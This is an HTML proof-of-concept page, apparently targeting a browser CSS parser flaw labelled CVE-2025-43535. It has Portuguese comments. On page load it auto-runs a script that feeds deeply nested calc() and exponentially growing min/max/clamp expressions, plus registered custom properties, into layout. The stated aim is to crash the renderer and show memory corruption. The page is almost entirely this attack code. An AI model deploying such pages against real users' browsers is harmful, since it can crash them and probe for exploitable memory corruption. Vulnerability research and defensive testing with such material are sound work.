<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 PoC — V1 Agressiva </title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px;
         height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<h3>CVE-2025-43535 — Memory Corruption Parser (V1 Agressiva) 3</h3>
<div id="log"></div>

<script>
"use strict";

const L=(m,c)=>{const d=document.getElementById('log');
  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop=d.scrollHeight;
};

// Respiro para o GC limpar as alocações da iteração *anterior*
const yieldGC = () => new Promise(r => setTimeout(r, 60));

async function variant1_css_calc_deep() {
  L("[V1] CSS calc() + math (Estrutura Exponencial Original)...");

  const el = document.createElement('div');
  el.style.cssText = 'position:absolute;top:-9999px';
  document.body.appendChild(el);
  const sheet = document.createElement('style');
  document.head.appendChild(sheet);

  // 1. calc() original
  function makeDeepcalc(depth, unit) {
    if (depth <= 0) return `10${unit}`;
    return `calc(${makeDeepcalc(depth-1, unit)} + ${depth}${unit})`;
  }

  const depths = [1, 2, 3, 4, 5];
  const units = ['px', 'em', 'rem', '%', 'vw', 'vh', 'fr'];

  for (const depth of depths) {
    for (const unit of units) {
      try {
        const calc = makeDeepcalc(depth, unit);
        sheet.textContent = `div.test-calc { width: ${calc}; height: ${calc}; }`;
        el.className = 'test-calc';
        void el.offsetWidth;
        
        el.style.width = calc;
        el.style.height = calc;
        void el.offsetWidth;
      } catch(e) {}
    }
    await yieldGC(); // Limpa as strings geradas pelo calc()
  }

  // 2. math functions originais (Agressividade restaurada)
  function makeMathNested(depth) {
    if (depth <= 0) return '10px';
    const funcs = ['min', 'max', 'clamp'];
    const f = funcs[depth % 3];
    if (f === 'clamp') {
      return `clamp(${makeMathNested(depth-1)}, ${depth*4}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
    }
    return `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
  }

  // Limite cauteloso: 25. 
  L("[V1] Executando loop math agressivo (limite = 25)...");
  for (let d = 1; d <= 26; d++) {
    try {
      const expr = makeMathNested(d);
      el.style.width = expr;
      el.style.height = expr;
      void el.offsetWidth;
      L(`[V1] Math depth ${d} processado.`);
    } catch(e) {}
    
    // CRÍTICO: Pausa a partir da iteração 20 para o GC destruir a string gigante anterior
    // Isso impede que o lixo do d=23 some com o d=24 e cause OOM.
    if (d >= 23) await yieldGC(); 
  }

  // 3. Custom properties original
  L("[V1] Registrando Custom Properties...");
  for (let i = 0; i < 2; i++) {
    try {
      const propName = `--test-prop-${i}`;
      if (typeof CSS !== 'undefined' && CSS.registerProperty) {
        CSS.registerProperty({
          name: propName,
          syntax: '<length>',
          inherits: true,
          initialValue: makeDeepcalc(10, 'px'),
        });
      }
      el.style.setProperty(propName, makeDeepcalc(20, 'px'));
    } catch(e) {}
  }

  sheet.textContent = '';
  document.head.removeChild(sheet);
  document.body.removeChild(el);
  L("[V1] Variante 1 finalizada", "ok");
}

async function main() {
  try {
    await variant1_css_calc_deep();
    L("=== COMPLETO ===", "ok");
    L("Se ocorrer um crash agora, as chances de corrupção real no parser são altíssimas.", "crash");
  } catch(e) {
    L("EXCEÇÃO FATAL: " + e.toString(), "fail");
  }
}

window.addEventListener('load', () => setTimeout(main, 300));
</script>
</body>
</html>
